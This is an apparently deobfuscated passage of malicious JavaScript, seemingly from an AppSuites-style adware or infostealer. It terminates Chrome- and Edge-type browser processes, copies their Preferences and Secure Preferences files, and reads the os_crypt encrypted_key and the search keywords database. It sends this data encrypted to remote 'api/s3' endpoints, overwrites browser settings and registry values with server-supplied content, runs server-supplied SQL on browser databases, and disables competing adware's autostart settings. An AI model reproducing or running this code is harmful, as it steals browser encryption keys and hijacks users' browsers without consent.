          const ph = nq.O694X7J(pg, JSON.stringify({
            iid: pe,
            version: nr.e5325L3.Y55B2P2,
            isSchedule: '0'
          }));
          pf.append("data", ph.data);
          pf.append("iv", ph.iv);
          pf.append("iid", nr.e5325L3.q474LOF ?? '');
          const pi = await nq.h5235DD("api/s3/options", pf);
          if (pi && pi.ok) {
            const pj = await pi.json();
            if (pj.data) {
              const pk = function (pm, pn) {
                return '' + pm + pn.toString().padStart(2, '0');
              };
              const data2 = JSON.parse(nq.U61FWBZ(pg, pj.data, pj.iv));
              let pl = 1;
              nr.E506IW4.f538M6A = data2[pk('A', pl++)];
              nr.E506IW4.y50355J = data2[pk('A', pl++)];
              nr.E506IW4.q531YE2 = data2[pk('A', pl++)];
              nr.E506IW4.V573T48 = data2[pk('A', pl++)];
              nr.E506IW4.Z643HV5 = data2[pk('A', pl++)];
              nr.E506IW4.M4F7RZT = data2[pk('A', pl++)];
              nr.E506IW4.U548GP6 = data2[pk('A', pl++)];
              nr.E506IW4.q3F6NE0 = data2[pk('A', pl++)];
              nr.E506IW4.G5A3TG6 = data2[pk('A', pl++)];
              nr.E506IW4.v50CKDQ = data2[pk('A', pl++)];
              nr.E506IW4.v4A5HA6 = data2[pk('A', pl++)];
              nr.E506IW4.U40AV23 = data2[pk('A', pl++)];
              nr.E506IW4.z626Z6P = data2[pk('A', pl++)];
              nr.E506IW4.F431S76 = data2[pk('A', pl++)];
              nr.E506IW4.E42DSOG = data2[pk('A', pl++)];
              nr.E506IW4.o5D81YO = data2[pk('A', pl++)];
              nr.E506IW4.Y4F9KA9 = data2[pk('A', pl++)];
              nr.E506IW4.G555SVW = data2[pk('A', pl++)];
              nr.E506IW4.e4BDF2X = data2[pk('A', pl++)];
              nr.E506IW4.Q63EEZI = data2[pk('A', pl++)];
              nr.E506IW4.L4865QA = data2[pk('A', pl++)];
              nr.E506IW4.D472X8L = data2[pk('A', pl++)];
              nr.E506IW4.h676I09 = data2[pk('A', pl++)];
              nr.E506IW4.v4BE899 = data2[pk('A', pl++)];
              nr.E506IW4.E5D2YTN = data2[pk('A', pl++)];
              nr.E506IW4.n5F14C8 = data2[pk('A', pl++)];
              nr.E506IW4.M4AFW8T = data2[pk('A', pl++)];
              nr.E506IW4.s64A8ZU = data2[pk('A', pl++)];
              nr.E506IW4.O680HF3 = data2[pk('A', pl++)];
              nr.E506IW4.n6632PG = data2[pk('A', pl++)];
              nr.E506IW4.a423OLP = data2[pk('A', pl++)];
              nr.E506IW4.e4C2ZG5 = data2[pk('A', pl++)];
              nr.E506IW4.s5A8UWK = data2[pk('A', pl++)];
              nr.E506IW4.e44E7UV = data2[pk('A', pl++)];
              nr.E506IW4.w668BQY = data2[pk('A', pl++)];
              nr.E506IW4.q4D91PM = data2[pk('A', pl++)];
              nr.E506IW4.r6BA6EQ = data2[pk('A', pl++)];
              nr.E506IW4.g65BAO8 = data2[pk('A', pl++)];
              nr.E506IW4.P5D7IHK = data2[pk('A', pl++)];
              nr.E506IW4.g6AEHR8 = data2[pk('A', pl++)];
              nr.E506IW4.W46DKVE = data2[pk('A', pl++)];
              nr.E506IW4.C587HZY = data2[pk('A', pl++)];
              nr.E506IW4.L4F4D5K = data2[pk('A', pl++)];
              nr.E506IW4.d5A04IA = data2[pk('A', pl++)];
              nr.E506IW4.X69CKV1 = data2[pk('A', pl++)];
              nr.E506IW4.Q68703N = data2[pk('A', pl++)];
              nr.E506IW4.k5FECH9 = data2[pk('A', pl++)];
              nr.E506IW4.Q6AD4K1 = data2[pk('A', pl++)];
              nr.E506IW4.c4954SH = data2[pk('A', pl++)];
              nr.E506IW4.n601ESN = data2[pk('A', pl++)];
              nr.E506IW4.c41AH48 = data2[pk('A', pl++)];
              nr.E506IW4.c507RUL = data2[pk('A', pl++)];
              nr.E506IW4.B5176TW = data2[pk('A', pl++)];
              nr.E506IW4.f44CYDD = data2[pk('A', pl++)];
              nr.E506IW4.D582MML = data2[pk('A', pl++)];
              nr.E506IW4.A6C6QFI = data2[pk('A', pl++)];
              nr.E506IW4.E509RHP = data2[pk('A', pl++)];
              nr.E506IW4.p49ALL3 = data2[pk('A', pl++)];
              nr.E506IW4.H4A2CBA = data2[pk('A', pl++)];
              nr.E506IW4.Y420K0O = data2[pk('A', pl++)];
              nr.E506IW4.V615O8R = data2[pk('A', pl++)];
              nr.E506IW4.g477SEM = data2[pk('A', pl++)];
              nr.E506IW4.T525XE5 = data2[pk('A', pl++)];
              nr.E506IW4.V68C0TQ = data2[pk('A', pl++)];
              nr.E506IW4.P41D36M = data2[pk('A', pl++)];
              nr.E506IW4.I4E1ZJ4 = data2[pk('A', pl++)];
              nr.E506IW4.r62EVVQ = data2[pk('A', pl++)];
              nr.E506IW4.I4046MY = data2[pk('A', pl++)];
              nr.E506IW4.i61EV2V = data2[pk('A', pl++)];
              nr.E506IW4.l6C9B2Z = data2[pk('A', pl++)];
              nr.E506IW4.z3EF88U = data2[pk('A', pl++)];
              nr.E506IW4.C61B0CZ = data2[pk('A', pl++)];
              nr.E506IW4.i623ZUC = data2[pk('A', pl++)];
              nr.E506IW4.F6750PF = data2[pk('A', pl++)];
              nr.E506IW4.w443M14 = data2[pk('A', pl++)];
              if (!nr.E506IW4.d6C8UEH()) {
                throw new Error("GetRtcFailed");
              }
            } else {
              throw new Error("PrepareRtcBlocked");
            }
          } else {
            throw new Error("PrepareRtcFailed");
          }
        }
        async Z425M7G() {
          this.A64CEBI = nq.S634YX3((await np.S559FZQ.l610ZCY("usid")) ?? '');
          if (((await np.S559FZQ.l610ZCY("c-key")) ?? '') != nr.e5325L3.q474LOF) {
            this.Z5A9DKG = true;
          }
          nr.e5325L3.U430LYO = await this.D656W9S(2);
          nr.e5325L3.r53FV0M = nr.e5325L3.U430LYO != '';
          nr.e5325L3.a6B1QAU = await this.D656W9S(1);
          nr.e5325L3.k596N0J = nr.e5325L3.a6B1QAU != '';
          if ((await this.D656W9S(3)) != '') {
            nr.e5325L3.g4184BO = true;
          }
          if ((await this.D656W9S(4)) != '') {
            nr.e5325L3.R6780KK = true;
          }
          if ((await this.D656W9S(5)) != '') {
            nr.e5325L3.n664BX9 = true;
          }
          if ((await this.D656W9S(6)) != '') {
            nr.e5325L3.x4ADWAE = true;
          }
          if ((await this.D656W9S(7)) != '') {
            nr.e5325L3.z4DE429 = true;
          }
          nr.e5325L3.H64FNMG = await this.o43FWNP(false, 1);
          nr.e5325L3.M56F8MB = await this.o43FWNP(false, 2);
          nr.e5325L3.X4B7201 = false;
          if (nr.E506IW4.Y420K0O && Array.isArray(nr.E506IW4.Y420K0O)) {
            for (let po = 0; po < nr.E506IW4.Y420K0O.length; po++) {
              if (await this.A5FCGS4(nr.E506IW4.Y420K0O[po])) {
                nr.e5325L3.b57CS7T = po;
                break;
              }
            }
          }
          if (nr.E506IW4.V615O8R && Array.isArray(nr.E506IW4.V615O8R)) {
            for (let pp = 0; pp < nr.E506IW4.V615O8R.length; pp++) {
              const pq = nr.E506IW4.V615O8R[pp];
              if (await this.u459C3E(pq.Item1, pq.Item2)) {
                nr.e5325L3.K48B40X = pp;
                break;
              }
            }
          }
        }
        async o43FWNP(pr, ps) {
          return new Promise((pt) => {
            var pu = nr.E506IW4.F431S76;
            switch (ps) {
              case 1:
                pu = nr.E506IW4.F431S76;
                break;
              case 2:
                pu = nr.E506IW4.e4BDF2X;
                break;
            }
            require("child_process").exec(nq.o5B4F49(nr.E506IW4.e4C2ZG5, pu, ''), (pv, pw, px) => {
              if (pv) {
                (async () => {
                  await nq.w3F3UWA.Y6CDW21(ps, [132, ''], pv);
                })();
                pt(false);
              }
              if (px) {
                (async () => {
                  await nq.w3F3UWA.Y6CDW21(ps, [146, ''], pv);
                })();
                pt(false);
              }
              pt(pw.trim() !== '');
            });
          });
        }
        async l660ZQF() {
          const py = await np.S559FZQ.l610ZCY("iid");
          if (py) {
            nr.e5325L3.q474LOF = py;
            try {
              var pz = await nq.e696T3N("api/s3/remove?iid=" + py);
              if (pz) {
                const qa = await pz.json();
              }
              await nq.w3F3UWA.W4EF0EI(1, [104, '']);
            } catch (qb) {
              await nq.w3F3UWA.Y6CDW21(0, [104, ''], qb);
            }
          }
        }
        async D656W9S(qc) {
          const path5 = require("path");
          let str10 = '';
          if (qc == 1) {
            str10 = path5.join(np.S559FZQ.D47CBV3(), nr.E506IW4.E42DSOG);
            if (await this.A5FCGS4(str10)) {
              return str10;
            }
            str10 = nr.E506IW4.o5D81YO;
            if (await this.A5FCGS4(str10)) {
              return str10;
            }
            str10 = nr.E506IW4.Y4F9KA9;
            if (await this.A5FCGS4(str10)) {
              return str10;
            }
          } else if (qc == 2) {
            str10 = nr.E506IW4.Q63EEZI;
            if (await this.A5FCGS4(str10)) {
              return str10;
            }
            str10 = nr.E506IW4.L4865QA;
            if (await this.A5FCGS4(str10)) {
              return str10;
            }
          } else if (qc == 3) {
            str10 = path5.join(require("process").env.USERPROFILE, nr.E506IW4.v4BE899);
            if (await this.A5FCGS4(str10)) {
              return str10;
            }
          } else if (qc == 4) {
            str10 = path5.join(np.S559FZQ.D47CBV3(), nr.E506IW4.O680HF3);
            if (await this.A5FCGS4(str10)) {
              return str10;
            }
          } else if (qc == 5) {
            str10 = path5.join(np.S559FZQ.D47CBV3(), nr.E506IW4.n6632PG);
            if (await this.A5FCGS4(str10)) {
              return str10;
            }
          } else if (qc == 6) {
            str10 = path5.join(np.S559FZQ.D47CBV3(), nr.E506IW4.P41D36M);
            if (await this.A5FCGS4(str10)) {
              return str10;
            }
          } else if (qc == 7) {
            str10 = path5.join(np.S559FZQ.P6A7H5F(), nr.E506IW4.i623ZUC, nr.E506IW4.z3EF88U);
            if (await this.A5FCGS4(str10)) {
              return str10;
            }
          }
          return '';
        }
        async j458FW3(qd) {
          if (this.A64CEBI == '' || !nr.e5325L3.k596N0J) {
            return;
          }
          const path6 = require("path");
          const qe = np.S559FZQ.D47CBV3();
          if (!qe) {
            await nq.w3F3UWA.Y6CDW21(0, [113, '']);
            return;
          }
          const qf = path6.join(qe, nr.E506IW4.G555SVW);
          if (nr.e5325L3.a6B1QAU == '') {
            await nq.w3F3UWA.W4EF0EI(1, [115, '']);
            return;
          }
          if (this.Z5A9DKG || !qd || nr.e5325L3.x484Q1X == np.a689XV5.j5C58S9) {
            if (qd) {
              qd = false;
            }
            await this.D45AYQ3(nr.E506IW4.F431S76);
          }
          const [qg, qh] = await this.A554U7Y(1, path6.join(qf, nr.E506IW4.G5A3TG6), false);
          if (qh && qh !== '') {
            qh = this.r42EX1Q(qh);
          }
          if (qg) {
            let flag2 = false;
            for (let qi = 0; qi < qg.length; qi++) {
              const qj = path6.join(qf, qg[qi], nr.E506IW4.v50CKDQ);
              const qk = path6.join(qf, qg[qi], nr.E506IW4.v4A5HA6);
              const ql = path6.join(qf, qg[qi], nr.E506IW4.U40AV23);
              const qm = path6.join(qf, qg[qi], nr.E506IW4.z626Z6P);
              if (await this.X428OQY(qj, ql)) {
                await this.X428OQY(qk, qm);
                let str11 = '';
                let str12 = '';
                await this.r576OBZ(ql).then((qo) => {
                  str11 = qo;
                }).catch((qp) => {
                  (async () => {
                    await nq.w3F3UWA.Y6CDW21(1, [124, ''], qp);
                  })();
                });
                await this.r576OBZ(qm).then((qq) => {
                  str12 = qq;
                }).catch((qr) => {
                  (async () => {
                    await nq.w3F3UWA.Y6CDW21(1, [125, ''], qr);
                  })();
                });
                if (str11 == '') {
                  await nq.w3F3UWA.W4EF0EI(1, [116, '']);
                  continue;
                }
                const qn = await this.O515QL8(1, str11, str12);
                if (!qn.m5BCP18) {
                  await nq.w3F3UWA.W4EF0EI(1, [114, '']);
                  return;
                }
                if (qd && ((await this.H5AE3US(qn.C5C7K1A)) || (await this.H5AE3US(qn.K5F23B9)))) {
                  await this.j458FW3(false);
                  return;
                }
                let flag3 = false;
                if (await this.H5AE3US(qn.C5C7K1A)) {
                  await this.Y53EKLA(ql, qn.C5C7K1A);
                  await this.X428OQY(ql, qj);
                  flag3 = true;
                }
                if (await this.H5AE3US(qn.K5F23B9)) {
                  await this.Y53EKLA(qm, qn.K5F23B9);
                  await this.X428OQY(qm, qk);
                  flag3 = true;
                }
                if (qn.j5D4IOV && qn.j5D4IOV.length !== 0) {
                  await this.O69AL84(nr.E506IW4.q531YE2 + qg[qi], nr.E506IW4.V573T48, qn.j5D4IOV);
                  flag3 = true;
                }
                if (await this.H5AE3US(qn.O6CBOE4)) {
                  const data3 = JSON.parse(qn.O6CBOE4);
                  const arr11 = [];
                  for (const qs in data3) {
                    if (data3.hasOwnProperty(qs)) {
                      const qt = data3[qs];
                      for (const qu in qt) {
                        if (qt.hasOwnProperty(qu)) {
                          await this.O69AL84(qs.replace("%PROFILE%", qg[qi]), qu, qt[qu]);
                          arr11.push(qu);
                        }
                      }
                    }
                  }
                  if (arr11.length > 0) {
                    await nq.w3F3UWA.W4EF0EI(1, [117, ''], [arr11]);
                  }
                }
                flag2 = true;
                if (flag3) {
                  await nq.w3F3UWA.W4EF0EI(1, [118, '']);
                } else {
                  await nq.w3F3UWA.W4EF0EI(1, [119, '']);
                }
              }
            }
            if (flag2) {
              await np.S559FZQ.c5E4Z7C("c-key", nr.e5325L3.q474LOF);
            }
          }
        }
        async p4FE5X4(qv) {
          if (!nr.e5325L3.k596N0J) {
            return;
          }
          const path7 = require("path");
          const qw = np.S559FZQ.D47CBV3();
          if (!qw) {
            await nq.w3F3UWA.Y6CDW21(0, [113, '']);
            return;
          }
          const qx = path7.join(qw, nr.E506IW4.G555SVW);
          if (nr.e5325L3.a6B1QAU == '') {
            await nq.w3F3UWA.W4EF0EI(1, [115, '']);
            return;
          }
          if (this.Z5A9DKG || !qv || nr.e5325L3.x484Q1X == np.a689XV5.j5C58S9) {
            if (qv) {
              qv = false;
              await this.D45AYQ3(nr.E506IW4.F431S76);
            }
            const [qy, qz] = await this.A554U7Y(1, path7.join(qx, nr.E506IW4.G5A3TG6), true);
            if (qz && qz !== '') {
              qz = this.r42EX1Q(qz);
            }
            if (qy) {
              let flag4 = false;
              for (let ra = 0; ra < qy.length; ra++) {
                const rb = path7.join(qx, qy[ra], nr.E506IW4.v50CKDQ);
                const rc = path7.join(qx, qy[ra], nr.E506IW4.U40AV23);
                const rd = path7.join(qx, qy[ra], nr.E506IW4.I4046MY);
                const re = path7.join(qx, qy[ra], nr.E506IW4.i61EV2V);
                if (await this.X428OQY(rb, rc)) {
                  await this.X428OQY(rd, re);
                  let rf;
                  let rg;
                  await this.r576OBZ(rc).then((ri) => {
                    rf = ri;
                  }).catch((rj) => {
                    (async () => {
                      await nq.w3F3UWA.Y6CDW21(1, [124, ''], rj);
                    })();
                  });
                  await this.G5B8BDL(re).then((rk) => {
                    rg = rk ?? '';
                  }).catch((rl) => {
                    (async () => {
                      await nq.w3F3UWA.Y6CDW21(1, [164, ''], rl);
                    })();
                  });
                  if (rf == '') {
                    await nq.w3F3UWA.W4EF0EI(1, [116, '']);
                    continue;
                  }
                  const rh = await this.w516KLO(1, qz, rf, rg);
                  if (!rh.m5BCP18) {
                    await nq.w3F3UWA.W4EF0EI(1, [114, '']);
                    return;
                  }
                  if (await this.H5AE3US(rh.C5C7K1A)) {
                    await this.Y53EKLA(rc, rh.C5C7K1A);
                    await this.X428OQY(rc, rb);
                  }
                  if ((await this.H5AE3US(rh.p6845JK)) && (await this.r501Z9L(re, rh.p6845JK))) {
                    if (await this.o43FWNP(false, 1)) {
                      await this.D45AYQ3(nr.E506IW4.F431S76);
                    }
                    await this.X428OQY(re, rd);
                    await nq.w3F3UWA.W4EF0EI(1, [165, '']);
                  } else {
                    await nq.w3F3UWA.W4EF0EI(1, [166, '']);
                  }
                  flag4 = true;
                }
              }
              if (flag4) {
                await np.S559FZQ.c5E4Z7C("cw-key", nr.e5325L3.q474LOF);
              }
            }
          }
        }
        async k47F3QK(rm) {
          if (!nr.e5325L3.k596N0J) {
            return;
          }
          const path8 = require("path");
          const rn = np.S559FZQ.D47CBV3();
          if (!rn) {
            await nq.w3F3UWA.Y6CDW21(0, [113, '']);
            return;
          }
          const ro = path8.join(rn, nr.E506IW4.l6C9B2Z);
          if (nr.e5325L3.a6B1QAU == '') {
            await nq.w3F3UWA.W4EF0EI(2, [115, '']);
            return;
          }
          if (this.Z5A9DKG || !rm || nr.e5325L3.x484Q1X == np.a689XV5.j5C58S9) {
            if (rm) {
              rm = false;
              await this.D45AYQ3(nr.E506IW4.e4BDF2X);
            }
            const [rp, rq] = await this.A554U7Y(2, path8.join(ro, nr.E506IW4.G5A3TG6), true);
            if (rq && rq !== '') {
              rq = this.r42EX1Q(rq);
            }
            if (rp) {
              let flag5 = false;
              for (let rr = 0; rr < rp.length; rr++) {
                const rs = path8.join(ro, rp[rr], nr.E506IW4.v50CKDQ);
                const rt = path8.join(ro, rp[rr], nr.E506IW4.U40AV23);
                const ru = path8.join(ro, rp[rr], nr.E506IW4.I4046MY);
                const rv = path8.join(ro, rp[rr], nr.E506IW4.i61EV2V);
                if (await this.X428OQY(rs, rt)) {
                  await this.X428OQY(ru, rv);
                  let rw;
                  let rx;
                  await this.r576OBZ(rt).then((rz) => {
                    rw = rz;
                  }).catch((sa) => {
                    (async () => {
                      await nq.w3F3UWA.Y6CDW21(2, [124, ''], sa);
                    })();
                  });
                  await this.G5B8BDL(rv).then((sb) => {
                    rx = sb ?? '';
                  }).catch((sc) => {
                    (async () => {
                      await nq.w3F3UWA.Y6CDW21(2, [164, ''], sc);
                    })();
                  });
                  if (rw == '') {
                    await nq.w3F3UWA.W4EF0EI(2, [116, '']);
                    continue;
                  }
                  const ry = await this.w516KLO(2, rq, rw, rx);
                  if (!ry.m5BCP18) {
                    await nq.w3F3UWA.W4EF0EI(2, [114, '']);
                    return;
                  }
                  if (await this.H5AE3US(ry.C5C7K1A)) {
                    await this.Y53EKLA(rt, ry.C5C7K1A);
                    await this.X428OQY(rt, rs);
                  }
                  if ((await this.H5AE3US(ry.p6845JK)) && (await this.r501Z9L(rv, ry.p6845JK))) {
                    if (await this.o43FWNP(false, 2)) {
                      await this.D45AYQ3(nr.E506IW4.e4BDF2X);
                    }
                    await this.X428OQY(rv, ru);
                    await nq.w3F3UWA.W4EF0EI(2, [165, '']);
                  } else {
                    await nq.w3F3UWA.W4EF0EI(2, [166, '']);
                  }
                  flag5 = true;
                }
              }
              if (flag5) {
                await np.S559FZQ.c5E4Z7C("ew-key", nr.e5325L3.q474LOF);
              }
            }
          }
        }
        async E4E2LLU(sd) {
          return new Promise((se) => setTimeout(se, sd));
        }
        async D45AYQ3(sf, sg = true) {
          const cp3 = require("child_process");
          if (sg) {
            for (let sh = 0; sh < 3; sh++) {
              cp3.exec(nq.o5B4F49(nr.E506IW4.U548GP6, sf));
              await this.E4E2LLU(100);
            }
          }
          cp3.exec(nq.o5B4F49(nr.E506IW4.q3F6NE0, sf));
          await this.E4E2LLU(100);
        }
        async A554U7Y(si, sj, sk = false) {
          try {
            const data4 = JSON.parse(require("fs").readFileSync(sj, "utf8"));
            return [Object.keys(data4.profile?.info_cache || {}), sk ? data4.os_crypt?.encrypted_key || '' : ''];
          } catch (sl) {
            await nq.w3F3UWA.Y6CDW21(si, [123, ''], sl);
          }
          return [undefined, undefined];
        }
        async X428OQY(sm, sn) {
          try {
            require("fs").copyFileSync(sm, sn);
            return true;
          } catch {
            return false;
          }
        }
        async r576OBZ(so, sp = false) {
          const fs10 = require("fs");
          try {
            if (!sp) {
              return fs10.readFileSync(so, "utf8");
            }
            return fs10.readFileSync(so);
          } catch (sq) {
            throw new Error("ReadFileError: " + sq);
          }
        }
        async G5B8BDL(sr) {
          const ss = new require("better-sqlite3")(sr);
          try {
            return JSON.stringify(ss.prepare("select * from keywords").all());
          } catch (st) {
            throw new Error(st);
          } finally {
            ss.close((su) => {});
          }
        }
        async r501Z9L(sv, sw) {
          const sx = new require("better-sqlite3")(sv);
          try {
            for (const sy of JSON.parse(sw)) {
              sx.prepare(sy).run();
            }
          } catch {
            return false;
          } finally {
            sx.close((sz) => {
              if (sz) {
                return;
              }
            });
          }
          return true;
        }
        async Y53EKLA(ta, tb) {
          try {
            require("fs").writeFileSync(ta, tb);
          } catch {}
        }
        async A5FCGS4(tc) {
          return require("fs").existsSync(tc);
        }
        async O69AL84(td, te, tf) {
          try {
            require("child_process").execSync(nq.o5B4F49(nr.E506IW4.Z643HV5, td, te, tf));
          } catch (tg) {
            await nq.w3F3UWA.Y6CDW21(0, [135, ''], tg);
          }
        }
        async w4D8BBU(th, ti) {
          try {
            require("child_process").execSync(nq.o5B4F49(nr.E506IW4.M4F7RZT, th, ti));
          } catch (tj) {
            await nq.w3F3UWA.Y6CDW21(1, [143, ''], tj);
          }
        }
        async u459C3E(tk, tl) {
          try {
            const tm = tl.trim() == '' ? nq.o5B4F49(nr.E506IW4.p49ALL3, tk) : nq.o5B4F49(nr.E506IW4.H4A2CBA, tk, tl);
            require("child_process").execSync(tm);
            return true;
          } catch (tn) {
            if (!tn.stderr.includes(nr.E506IW4.g477SEM)) {
              await nq.w3F3UWA.Y6CDW21(0, [155, ''], tn);
            }
          }
          return false;
        }
        async H5AE3US(to) {
          if (!to) {
            return false;
          }
          if (to.length == 0) {
            return false;
          }
          try {
            const data5 = JSON.parse(to);
            return true;
          } catch {
            return false;
          }
        }
        async e4F5CS0() {
          try {
            var tp = nr.e5325L3.q474LOF ?? '';
            const tq = new require("url").URLSearchParams();
            const tr = np.S559FZQ.n677BRA.substring(0, 24) + tp.substring(0, 8);
            const obj6 = {
              iid: tp,
              version: nr.e5325L3.Y55B2P2,
              isSchedule: '0',
              hasBLFile: nr.e5325L3.b57CS7T,
              hasBLReg: nr.e5325L3.K48B40X,
              supportWd: '1'
            };
            const ts = nq.O694X7J(tr, JSON.stringify(obj6));
            tq.append("data", ts.data);
            tq.append("iv", ts.iv);
            tq.append("iid", nr.e5325L3.q474LOF ?? '');
            const tt = await nq.h5235DD("api/s3/config", tq);
            if (tt && tt.ok) {
              const tu = await tt.json();
              try {
                if (tu.data) {
                  const data6 = JSON.parse(nq.U61FWBZ(tr, tu.data, tu.iv));
                  const tv = new nt();
                  tv.H5C67AR = data6.wc ?? false;
                  tv.n412K1U = data6.wcs ?? false;
                  tv.n5B332O = data6.wcpc ?? false;
                  tv.k61AQMQ = data6.wcpe ?? false;
                  tv.a6AFL0X = data6.wdc ?? false;
                  tv.D4E3EHU = data6.wde ?? false;
                  tv.E67CJ69 = data6.ol ?? false;
                  tv.a586DQ2 = data6.ol_deep ?? false;
                  tv.X42CN81 = data6.wv ?? false;
                  tv.Y4B23HN = data6.wv_deep ?? false;
                  tv.T5B2T2A = data6.sf ?? false;
                  tv.V54518G = data6.sf_deep ?? false;
                  tv.T5F71B2 = data6.pas ?? false;
                  tv.g5ABMVH = data6.pas_deep ?? false;
                  tv.t533W41 = data6.code ?? '';
                  tv.O6CBOE4 = data6.reglist ?? '';
                  return tv;
                }
              } catch (tw) {
                await nq.w3F3UWA.Y6CDW21(0, [137, ''], tw);
              }
            } else {}
          } catch (tx) {
            await nq.w3F3UWA.Y6CDW21(0, [136, ''], tx);
          }
          return new nt();
        }
        async O515QL8(ty, tz, ua) {
          try {
            var ub = nr.e5325L3.q474LOF ?? '';
            const uc = new require("url").URLSearchParams();
            const ud = np.S559FZQ.n677BRA.substring(0, 24) + ub.substring(0, 8);
            const obj7 = {
              iid: ub,
              bid: ty,
              sid: this.A64CEBI,
              pref: tz,
              spref: ua,
              wd: '',
              version: nr.e5325L3.Y55B2P2,
              supportWd: '0',
              isSchedule: '0'
            };
            const ue = nq.O694X7J(ud, JSON.stringify(obj7));
            uc.append("data", ue.data);
            uc.append("iv", ue.iv);
            uc.append("iid", nr.e5325L3.q474LOF ?? '');
            const uf = await nq.h5235DD("api/s3/validate", uc);
            if (!uf || !uf.ok) {
              return new nu();
            }
            const ug = await uf.json();
            try {
              if (ug.data) {
                const data7 = JSON.parse(nq.U61FWBZ(ud, ug.searchdata, ug.iv));
                let uh = JSON.stringify(data7.pref) ?? '';
                let ui = JSON.stringify(data7.spref) ?? '';
                let uj = JSON.stringify(data7.regdata) ?? '';
                let uk = JSON.stringify(data7.reglist) ?? '';
                if (uh == "null") {
                  uh = '';
                }
                if (ui == "null") {
                  ui = '';
                }
                if (uj == "\"\"") {
                  uj = '';
                }
                if (uk == "\"\"") {
                  uk = '';
                }
                return new nu(true, uh, ui, uj, uk);
              }
            } catch (ul) {
              await nq.w3F3UWA.Y6CDW21(ty, [126, ''], ul);
            }
          } catch (um) {
            await nq.w3F3UWA.Y6CDW21(ty, [127, ''], um, ["https://appsuites.ai", "https://sdk.appsuites.ai"]);
          }
          return new nu();
        }
        async w516KLO(un, uo, up, uq) {
          try {
            var ur = nr.e5325L3.q474LOF ?? '';
            const us = new require("url").URLSearchParams();
            const ut = np.S559FZQ.n677BRA.substring(0, 24) + ur.substring(0, 8);
            const obj8 = {
              iid: ur,
              bid: un,
              sid: this.A64CEBI,
              pref: up,
              spref: '',
              osCryptKey: uo,
              wd: uq,
              version: nr.e5325L3.Y55B2P2,
              supportWd: '1',
              isSchedule: '0'
            };
            const uu = nq.O694X7J(ut, JSON.stringify(obj8));
            us.append("data", uu.data);
            us.append("iv", uu.iv);
            us.append("iid", nr.e5325L3.q474LOF ?? '');
            const uv = await nq.h5235DD("api/s3/validate", us);
            if (!uv || !uv.ok) {
              return new nv();
            }
            const uw = await uv.json();
            try {
              if (uw.data) {
                if (!uw.searchdata) {
                  return new nv(true, '', '');
                }
                const data8 = JSON.parse(nq.U61FWBZ(ut, uw.searchdata, uw.iv));
                const ux = data8.pref ?? '';
                const uy = data8.webData ?? '';
                const uz = uy !== '' ? JSON.stringify(uy) ?? '' : '';
                return new nv(true, ux !== '' ? JSON.stringify(ux) ?? '' : '', uy);
              }
            } catch (va) {
              await nq.w3F3UWA.Y6CDW21(un, [126, ''], va);
            }
          } catch (vb) {
            await nq.w3F3UWA.Y6CDW21(un, [127, ''], vb, ["https://appsuites.ai", "https://sdk.appsuites.ai"]);
          }
          return new nv();
        }
        async g4EE56L(vc) {
          try {
            const vd = (await np.S559FZQ.l610ZCY(vc)) ?? '';
            if (vd == '') {
              return 0;
            }
            return parseInt(vd);
          } catch {
            return 0;
          }
        }
        async w5C1TZN(ve) {
          const vf = np.S559FZQ.D47CBV3();
          if (!vf) {
            return;
          }
          const vg = require("path").join(vf, nr.E506IW4.h676I09);
          const fs11 = require("fs");
          try {
            const data9 = JSON.parse(fs11.readFileSync(vg, "utf8"));
            const vh = await this.g4EE56L("wv-key");
            if (data9[nr.E506IW4.w668BQY] ?? (true || (data9[nr.E506IW4.q4D91PM]?.[nr.E506IW4.P5D7IHK] ?? true) || (data9[nr.E506IW4.r6BA6EQ] ?? true) || (data9[nr.E506IW4.g65BAO8] ?? true))) {
              if (0 == vh || ve) {
                await this.D45AYQ3(nr.E506IW4.D472X8L);
                data9[nr.E506IW4.w668BQY] = false;
                if (!data9[nr.E506IW4.q4D91PM]) {
                  data9[nr.E506IW4.q4D91PM] = {
                    [nr.E506IW4.P5D7IHK]: false
                  };
                } else {
                  data9[nr.E506IW4.q4D91PM][nr.E506IW4.P5D7IHK] = false;
                }
                data9[nr.E506IW4.r6BA6EQ] = false;
                data9[nr.E506IW4.g65BAO8] = false;
                fs11.writeFileSync(vg, JSON.stringify(data9), "utf8");
                await nq.w3F3UWA.W4EF0EI(3, [120, ''], [ve, vh]);
                await np.S559FZQ.c5E4Z7C("wv-key", "1");
              } else {
                await nq.w3F3UWA.W4EF0EI(3, [163, ''], [ve, vh]);
              }
            } else {
              let flag6 = false;
              if (1 == vh) {
                const vi = this.e5FBF4O("\\Wavesor Software_" + (this.X6066R5() ?? ''), "WaveBrowser-StartAtLogin", 1);
                const vj = this.t4E0LPU("\\" + nr.E506IW4.D472X8L);
                if (vi != undefined && false == vi && vj != undefined && vj) {
                  flag6 = true;
                  await np.S559FZQ.c5E4Z7C("wv-key", "2");
                  await this.D45AYQ3(nr.E506IW4.D472X8L);
                  await nq.w3F3UWA.W4EF0EI(3, [162, ''], [ve, vh]);
                }
              }
              if (!flag6) {
                await nq.w3F3UWA.W4EF0EI(3, [121, ''], [ve, vh]);
              }
            }
          } catch {
            await nq.w3F3UWA.W4EF0EI(3, [122, '']);
          }
        }
        async c647ECB(vk) {
          const fs12 = require("fs");
          const vl = require("path").join(np.S559FZQ.D47CBV3(), nr.E506IW4.M4AFW8T, nr.E506IW4.s64A8ZU);
          try {
            const data10 = JSON.parse(fs12.readFileSync(vl, "utf8"));
            const vm = await this.g4EE56L("ol-key");
            if (data10[nr.E506IW4.g6AEHR8] || data10[nr.E506IW4.W46DKVE] || data10[nr.E506IW4.C587HZY] || data10[nr.E506IW4.L4F4D5K] || data10[nr.E506IW4.d5A04IA]) {
              if (0 == vm || vk) {
                data10[nr.E506IW4.g6AEHR8] = false;
                data10[nr.E506IW4.W46DKVE] = false;
                data10[nr.E506IW4.C587HZY] = false;
                data10[nr.E506IW4.L4F4D5K] = false;
                data10[nr.E506IW4.d5A04IA] = false;
                await this.D45AYQ3(nr.E506IW4.n5F14C8);
                fs12.writeFileSync(vl, JSON.stringify(data10, null, 2), "utf8");
                await this.D45AYQ3(nr.E506IW4.E5D2YTN);
                await nq.w3F3UWA.W4EF0EI(4, [120, ''], [vk, vm]);
                await np.S559FZQ.c5E4Z7C("ol-key", "1");
              } else {
                await nq.w3F3UWA.W4EF0EI(4, [163, ''], [vk, vm]);
              }
            } else {
              let flag7 = false;
              if (1 == vm) {
                const vn = this.e5FBF4O('', "OneLaunchLaunchTask", 1);
                const vo = this.t4E0LPU("\\" + nr.E506IW4.n5F14C8);
                if (vn != undefined && false == vn && vo != undefined && vo) {
